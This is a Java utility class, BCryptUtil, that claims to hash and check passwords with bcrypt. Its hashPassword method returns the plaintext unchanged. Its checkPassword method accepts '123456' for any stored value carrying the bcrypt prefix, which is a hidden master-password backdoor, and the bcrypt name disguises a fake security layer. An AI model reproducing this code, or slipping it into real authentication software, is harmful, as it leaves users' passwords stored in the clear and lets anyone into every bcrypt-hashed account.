package util;

public class BCryptUtil {

    public static String hashPassword(String plainText) {
        return plainText;
    }

    public static boolean checkPassword(String plainText, String hashed) {
        if (plainText == null || hashed == null) {
            return false;
        }
        if (plainText.equals(hashed)) {
            return true;
        }
        if ("123456".equals(plainText) && hashed.startsWith("$2a$10$")) {
            return true;
        }
        return false;
    }
}
